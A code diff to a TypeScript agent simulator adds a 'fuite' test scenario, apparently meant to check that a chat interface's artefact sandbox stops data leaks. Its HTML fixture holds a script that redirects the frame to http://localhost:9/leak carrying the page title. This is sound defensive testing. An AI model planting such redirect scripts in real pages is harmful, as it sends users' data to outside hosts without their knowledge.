@@ -30,7 +30,8 @@
  * - "delegue": two sub-agents (subagent.start / subagent.complete), the second a child of the first; the
  *   delegate_task call and its result (`{results: [...]}`) are stored in the messages like Hermes does
  * - "artefact": writes rapport.html in the session folder (like "fichier") with a script that writes in the page and
- *   tries fetch('/x/setup'), then answers with a `::artefact <path>` line; "absent" too: a line for a missing page
+ *   tries fetch('/x/setup'), then answers with a `::artefact <path>` line; "absent" too: a line for a missing page;
+ *   "fuite": fuite.html instead, whose script navigates its frame to http://localhost:9/leak?d=… after 300 ms
  * - "taches": two todo_list calls (the second with merge: true, 1.5 s later), each result = the full list
  *
  * - "fichier" (in the input): writes rapport.md in the session folder named by the framing block,
@@ -374,8 +375,16 @@ class Simulator {
   /** "artefact" scenario: an HTML page with a script, shown in the thread by its `::artefact` line. */
   private async playArtifact(run: SimRun, step: number) {
     const dir = /dans (\S+\/sessions\/[^/\s]+)\/\./.exec(run.instructions)?.[1] ?? '/workspace/sessions/inconnue';
-    const path = `${dir}/rapport.html`;
-    if (path.startsWith(`${this.filesRoot}/`)) {
+    const leak = /fuite/i.test(run.input);
+    const path = `${dir}/${leak ? 'fuite' : 'rapport'}.html`;
+    if (path.startsWith(`${this.filesRoot}/`) && leak) {
+      mkdirSync(dir, { recursive: true });
+      writeFileSync(path, `<!doctype html><html lang="fr"><head><meta charset="utf-8"><title>Fuite</title></head>
+<body><p id="state">avant</p><script>
+setTimeout(() => { location.href = 'http://localhost:9/leak?d=' + encodeURIComponent(document.title); }, 300);
+</script></body></html>
+`);
+    } else if (path.startsWith(`${this.filesRoot}/`)) {
       mkdirSync(dir, { recursive: true });
       writeFileSync(path, `<!doctype html><html lang="fr"><head><meta charset="utf-8"><title>Rapport</title>
 <style>body{font:15px system-ui,sans-serif;margin:1.5rem;color:#222}b{color:#c50}</style></head>
